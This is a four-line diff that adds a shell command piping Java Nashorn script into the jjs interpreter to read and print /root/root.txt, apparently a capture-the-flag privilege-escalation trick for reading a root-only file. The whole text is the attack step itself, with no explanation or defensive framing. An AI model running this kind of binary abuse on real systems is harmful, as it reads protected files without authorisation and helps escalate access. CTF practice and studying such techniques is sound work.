@@ -1,0 +1,4 @@
+echo 'var BufferedReader = Java.type("java.io.BufferedReader");
+> var FileReader = Java.type("java.io.FileReader");
+> var br = new BufferedReader(new FileReader("/root/root.txt"));
+> while ((line = br.readLine()) != null) { print(line); }' | jjs
